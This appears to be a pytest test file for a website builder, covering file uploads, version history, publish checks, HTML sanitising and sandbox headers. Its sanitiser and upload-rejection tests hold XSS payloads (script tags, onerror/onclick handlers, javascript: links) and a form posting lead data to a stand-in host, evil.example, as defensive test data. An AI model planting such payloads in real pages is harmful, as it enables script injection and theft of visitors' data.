"""Reference uploads, site version history, pre-launch checks, publishing, HTML sanitising and the page sandbox."""
import io
import json

import pytest
from PIL import Image

from app.routers.sites import sanitize_html


def png_bytes(size=(80, 60), color=(30, 120, 200)):
    buf = io.BytesIO()
    Image.new("RGB", size, color).save(buf, "PNG")
    return buf.getvalue()


def pdf_bytes(text="Skyline Homes brochure. 2 and 3 BHK flats near the metro from 45 lakh."):
    """A tiny but valid single-page PDF with a text layer."""
    stream = f"BT /F1 12 Tf 40 700 Td ({text}) Tj ET".encode()
    objs = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            b"<< /Length %d >>\nstream\n" % len(stream) + stream + b"\nendstream",
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    out, offsets = io.BytesIO(), []
    out.write(b"%PDF-1.4\n")
    for i, o in enumerate(objs, 1):
        offsets.append(out.tell())
        out.write(b"%d 0 obj\n" % i + o + b"\nendobj\n")
    xref = out.tell()
    out.write(b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1))
    for off in offsets:
        out.write(b"%010d 00000 n \n" % off)
    out.write(b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF" % (len(objs) + 1, xref))
    return out.getvalue()


def docx_bytes(text="Our clinic offers same-week dental appointments and painless cleaning."):
    import docx
    d = docx.Document()
    d.add_paragraph(text)
    buf = io.BytesIO()
    d.save(buf)
    return buf.getvalue()


def upload(c, name, data, ctype="application/octet-stream"):
    return c.post("/api/references", files={"file": (name, data, ctype)})


# ---- references ------------------------------------------------------------------------
def test_upload_image_pdf_docx_text(auth_client):
    img = upload(auth_client, "ref.png", png_bytes(), "image/png").json()
    assert img["kind"] == "image" and img["width"] == 80 and img["ref"] == f"ref:{img['id']}"
    pdf = upload(auth_client, "brochure.pdf", pdf_bytes(), "application/pdf").json()
    assert pdf["kind"] == "document" and "near the metro" in pdf["excerpt"]
    doc = upload(auth_client, "about.docx", docx_bytes()).json()
    assert "same-week dental" in doc["excerpt"]
    txt = upload(auth_client, "notes.md", b"# Notes\nWe open 7 days a week, 9am to 9pm.").json()
    assert txt["kind"] == "document" and "7 days" in txt["excerpt"]
    kinds = [r["kind"] for r in auth_client.get("/api/references").json()]
    assert sorted(kinds) == ["document", "document", "document", "image"]
    assert len(auth_client.get("/api/references?kind=image").json()) == 1


@pytest.mark.parametrize("name,data,msg", [
    ("virus.exe", b"MZ\x90\x00" + b"\x00" * 100, "Unsupported"),
    ("archive.zip", b"PK\x03\x04" + b"\x00" * 100, "Unsupported"),
    ("logo.svg", b"<svg onload=alert(1)></svg>", "Unsupported"),
    ("page.html", b"<html><script>alert(1)</script></html>", "Unsupported"),
    ("photo.heic", b"\x00\x00\x00\x18ftypheic", "HEIC"),
    ("old.doc", b"\xd0\xcf\x11\xe0" + b"\x00" * 100, ".docx"),
    ("binary.txt", b"\x00\x01\x02text", "binary"),
    ("empty.txt", b"", "empty"),
    ("short.txt", b"hi", "readable text"),
    ("fake.docx", b"PK\x03\x04not really a docx", "Word file"),
    ("broken.pdf", b"%PDF-1.4 garbage", "PDF couldn't be read"),
])
def test_upload_rejections(auth_client, name, data, msg):
    r = upload(auth_client, name, data)
    assert r.status_code == 400 and msg in r.json()["detail"], r.text


def test_encrypted_pdf_rejected(auth_client):
    from pypdf import PdfWriter
    w = PdfWriter()
    w.add_blank_page(100, 100)
    w.encrypt("secret")
    buf = io.BytesIO()
    w.write(buf)
    r = upload(auth_client, "locked.pdf", buf.getvalue())
    assert r.status_code == 400 and "password" in r.json()["detail"]


def test_upload_size_limit(auth_client):
    r = upload(auth_client, "big.txt", b"a" * (15 * 1024 * 1024 + 5))
    assert r.status_code == 400 and "15 MB" in r.json()["detail"]


def test_references_are_private(auth_client, other_client):
    r = upload(auth_client, "ref.png", png_bytes()).json()
    assert other_client.get(r["url"]).status_code == 404
    assert other_client.delete(f"/api/references/{r['id']}").status_code == 404
    assert other_client.post("/api/content/image", json={"prompt": "a cat", "provider": "builtin:fal", "reference": r["ref"]}).status_code in (400, 404)
    assert auth_client.delete(f"/api/references/{r['id']}").json() == {"ok": True}
    assert auth_client.get(r["url"]).status_code == 404


def test_reference_image_guides_fal(auth_client, mock_http):
    auth_client.post("/api/integrations/fal/key", json={"values": {"api_key": "a:b"}})
    r = upload(auth_client, "ref.png", png_bytes()).json()
    route = mock_http.post("https://fal.run/fal-ai/flux/dev/image-to-image").respond(json={"images": [{"url": "https://cdn.fal/x.png"}]})
    a = auth_client.post("/api/content/image", json={"prompt": "same style", "provider": "builtin:fal",
                                                     "model": "fal-ai/flux/dev/image-to-image", "reference": r["ref"]}).json()[0]
    assert json.loads(route.calls[0].request.content)["image_url"].startswith("data:image/png;base64,")
    assert a["params"]["batch"] and a["params"]["reference"] is True
    doc = upload(auth_client, "notes.txt", b"Plenty of readable text here for the writer.").json()
    bad = auth_client.post("/api/content/image", json={"prompt": "x room", "provider": "builtin:fal", "reference": doc["ref"]})
    assert bad.status_code == 400 and "document" in bad.json()["detail"]


def test_uploaded_image_starts_a_video(auth_client, mock_http):
    auth_client.post("/api/integrations/fal/key", json={"values": {"api_key": "a:b"}})
    r = upload(auth_client, "product.png", png_bytes()).json()
    route = mock_http.post("https://queue.fal.run/fal-ai/ltx-2/image-to-video").respond(json={"status_url": "s", "response_url": "r"})
    auth_client.post("/api/content/video", json={"prompt": "slow spin", "start_ref": r["ref"]})
    assert json.loads(route.calls[0].request.content)["image_url"].startswith("data:image/png")


def test_document_references_brief_the_ai_writer(auth_client, other_client, mock_http):
    auth_client.post("/api/providers", json={"preset": "openai", "api_key": "k", "verify": False})
    page = '<html><head></head><body><h1>Hi</h1><form data-aimva-lead><input name="phone"></form></body></html>'
    route = mock_http.post("https://api.openai.com/v1/chat/completions").respond(json={"choices": [{"message": {"content": page}}]})
    doc = upload(auth_client, "brochure.pdf", pdf_bytes()).json()
    site = auth_client.post("/api/sites", json={"business": "Skyline Homes", "references": [doc["id"]]}).json()
    assert site["generator"] == "ai"
    prompt = json.loads(route.calls[0].request.content)["messages"][-1]["content"]
    assert "Background material" in prompt and "near the metro" in prompt
    assert other_client.post("/api/sites", json={"business": "Other Co", "references": [doc["id"]]}).status_code == 404


def test_uploaded_image_as_hero_is_embedded(auth_client):
    r = upload(auth_client, "hero.png", png_bytes()).json()
    html = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False, "hero_image": r["ref"]}).json()["html"]
    assert "url('data:image/" in html or 'class="hero-img" src="data:image/' in html  # showcase paints it as the hero background


def test_ai_needs_some_detail(auth_client):
    r = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": True})
    assert r.status_code == 400 and "make things up" in r.json()["detail"]


# ---- versions ------------------------------------------------------------------------------
def test_versions_never_overwrite(auth_client):
    s = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False, "offer": "First offer"}).json()
    first_html = s["html"]
    auth_client.post(f"/api/sites/{s['id']}/regenerate", json={"business": "Acme", "use_ai": False, "offer": "Second offer"})
    auth_client.patch(f"/api/sites/{s['id']}", json={"html": "<h1>Hand edited</h1>"})
    auth_client.patch(f"/api/sites/{s['id']}", json={"html": "<h1>Hand edited</h1>"})  # unchanged: no new version
    versions = auth_client.get(f"/api/sites/{s['id']}/versions").json()
    assert [v["note"] for v in versions] == ["Edited HTML", "Regenerated", "Generated"] and versions[0]["current"]
    v1 = versions[-1]
    assert "First offer" in auth_client.get(f"/api/sites/{s['id']}/versions/{v1['id']}").json()["html"]
    restored = auth_client.post(f"/api/sites/{s['id']}/versions/{v1['id']}/restore").json()
    assert restored["html"] == first_html
    assert auth_client.get(f"/api/sites/{s['id']}/versions").json()[0]["note"] == "Restored version 1"


def test_versions_capped_and_private(auth_client, other_client):
    s = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False}).json()
    for i in range(35):
        auth_client.patch(f"/api/sites/{s['id']}", json={"html": f"<form data-aimva-lead><input name=phone></form>{i}"})
    versions = auth_client.get(f"/api/sites/{s['id']}/versions").json()
    assert len(versions) == 30 and versions[0]["number"] == 36
    assert other_client.get(f"/api/sites/{s['id']}/versions").status_code == 404
    assert other_client.post(f"/api/sites/{s['id']}/versions/{versions[0]['id']}/restore").status_code == 404


def test_html_size_limit(auth_client):
    s = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False}).json()
    r = auth_client.patch(f"/api/sites/{s['id']}", json={"html": "x" * 3_000_001})
    assert r.status_code == 400 and "too large" in r.json()["detail"]


# ---- checks & publish -----------------------------------------------------------------------
def test_checks_and_blocked_publish(auth_client):
    s = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False}).json()
    checks = {c["key"]: c for c in auth_client.get(f"/api/sites/{s['id']}/checks").json()}
    assert checks["form"]["ok"] and checks["contact"]["ok"] and checks["title"]["ok"]
    auth_client.patch(f"/api/sites/{s['id']}", json={"html": "<html><body><h1>No form</h1></body></html>"})
    r = auth_client.post(f"/api/sites/{s['id']}/publish", json={"name": "Acme", "slug": "acme"})
    assert r.status_code == 400 and "lead form" in r.json()["detail"]
    assert auth_client.get(f"/api/sites/{s['id']}").json()["slug"] == s["slug"]  # nothing changed on failure


def test_publish_flow(auth_client, client):
    s = auth_client.post("/api/sites", json={"business": "Acme Homes", "use_ai": False}).json()
    r = auth_client.post(f"/api/sites/{s['id']}/publish", json={
        "name": "Acme Homes Launch", "slug": "acme-homes", "target": "aimva", "custom_domain": "https://Offers.Acme.com/",
        "seo_title": "Acme <Homes> in Pune", "seo_description": 'Book a "free" visit'})
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["published"] and out["slug"] == "acme-homes" and out["custom_domain"] == "offers.acme.com"
    page = client.get("/s/acme-homes")
    assert page.status_code == 200
    assert "<title>Acme &lt;Homes&gt; in Pune</title>" in page.text and "Book a &quot;free&quot; visit" in page.text
    assert page.headers["content-security-policy"].startswith("sandbox") and "allow-same-origin" not in page.headers["content-security-policy"]
    assert auth_client.get(f"/api/sites/{s['id']}/versions").json()[0]["note"] == "SEO updated for launch"


def test_publish_validation(auth_client):
    a = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False}).json()
    b = auth_client.post("/api/sites", json={"business": "Beta", "use_ai": False}).json()
    auth_client.post(f"/api/sites/{a['id']}/publish", json={"name": "Acme", "slug": "taken-name"})
    r = auth_client.post(f"/api/sites/{b['id']}/publish", json={"name": "Beta", "slug": "taken-name"})
    assert r.status_code == 409 and "taken" in r.json()["detail"]
    for bad in ({"slug": "Bad Slug!"}, {"slug": "-dash"}, {"custom_domain": "not a domain"}, {"target": "ftp"}, {"name": "x"}):
        assert auth_client.post(f"/api/sites/{b['id']}/publish", json={"name": "Beta", "slug": "beta", **bad}).status_code == 422, bad


def test_seo_title_with_backslashes_is_literal(auth_client):
    s = auth_client.post("/api/sites", json={"business": "Acme", "use_ai": False}).json()
    auth_client.post(f"/api/sites/{s['id']}/publish", json={"name": "Acme", "slug": "acme-bs", "seo_title": r"Deals \1 \g<0> today"})
    assert r"<title>Deals \1 \g&lt;0&gt; today</title>" in auth_client.get(f"/api/sites/{s['id']}").json()["html"]


# ---- sanitising AI output ----------------------------------------------------------------------
def test_sanitize_html_strips_active_content():
    dirty = ('<html><head><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example">'
             '<script>steal()</script><script src="https://evil.example/x.js"></script></head><body>'
             '<h1 onclick="steal()" onmouseover=\'x()\'>Hi</h1><a href="javascript:steal()">x</a><img src=x onerror=steal()>'
             '<iframe src="https://evil.example"></iframe><object data="x"></object><embed src="x">'
             '<form data-aimva-lead action="https://evil.example/collect"><input name="phone" formaction="https://evil.example"></form>'
             '<p data-action="keep">ok</p></body></html>')
    clean = sanitize_html(dirty)
    for bad in ("<script", "steal()", "javascript:", "<iframe", "<object", "<embed", "evil.example", "onerror", "onclick", "<base"):
        assert bad not in clean, bad
    assert "data-aimva-lead" in clean and 'name="phone"' in clean and 'data-action="keep"' in clean


def test_ai_page_is_sanitised_but_keeps_our_form_script(auth_client, mock_http):
    auth_client.post("/api/providers", json={"preset": "openai", "api_key": "k", "verify": False})
    page = '<html><body><h1 onclick="x()">Hi</h1><script>alert(1)</script><form data-aimva-lead><input name="email"></form></body></html>'
    mock_http.post("https://api.openai.com/v1/chat/completions").respond(json={"choices": [{"message": {"content": page}}]})
    site = auth_client.post("/api/sites", json={"business": "Acme", "offer": "Trial"}).json()
    assert "alert(1)" not in site["html"] and "onclick" not in site["html"]
    assert "data-aimva-lead" in site["html"] and f"/api/public/sites/{site['slug']}/lead" in site["html"]


def test_owner_preview_works_for_drafts_and_skips_visits(auth_client, other_client):
    s = auth_client.post("/api/sites", json={"business": "Preview Co", "use_ai": False}).json()
    r = auth_client.get(f"/api/sites/{s['id']}/preview")
    assert r.status_code == 200 and "Preview Co" in r.text
    assert r.headers["content-security-policy"].startswith("sandbox")
    assert other_client.get(f"/api/sites/{s['id']}/preview").status_code == 404
    assert auth_client.get(f"/api/sites/{s['id']}").json()["visits"] == 0
